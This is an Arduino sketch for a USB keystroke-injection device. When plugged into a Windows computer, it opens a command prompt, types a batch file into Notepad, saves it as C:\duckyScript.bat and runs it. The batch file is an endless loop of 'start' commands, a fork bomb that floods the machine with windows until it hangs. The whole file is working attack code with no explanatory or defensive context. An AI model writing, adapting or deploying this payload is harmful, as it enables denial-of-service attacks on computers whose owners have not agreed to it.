#include <Keyboard.h>

char windows = KEY_LEFT_GUI;
char ctrl = KEY_LEFT_CTRL;
char enter = KEY_RETURN;
char alt = KEY_LEFT_ALT;

int delayTime = 150;

void cmd() {
  Keyboard.press(windows);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(delayTime);
  
  Keyboard.println("cmd");
  delay(delayTime);
}

void closeProgram() {
  //close notepad
  Keyboard.press(alt);
  Keyboard.write(197); // f4
  Keyboard.releaseAll();
  delay(delayTime);
}

void setup() {
  delay(1000);
  Keyboard.begin();

  //delete old if exists
  cmd();
  Keyboard.println("del duckyScript.bat");
  Keyboard.println("notepad");
  delay(delayTime);

  //write batch file
  Keyboard.println(":a");
  Keyboard.println("start");
  Keyboard.println("goto a");

  //save
  Keyboard.press(ctrl);
  Keyboard.press('s');
  Keyboard.releaseAll();

  Keyboard.println("C:\\duckyScript.bat");
  delay(delayTime);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(delayTime);

  closeProgram();

  //start batch
  Keyboard.println("duckyScript.bat");
  
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}
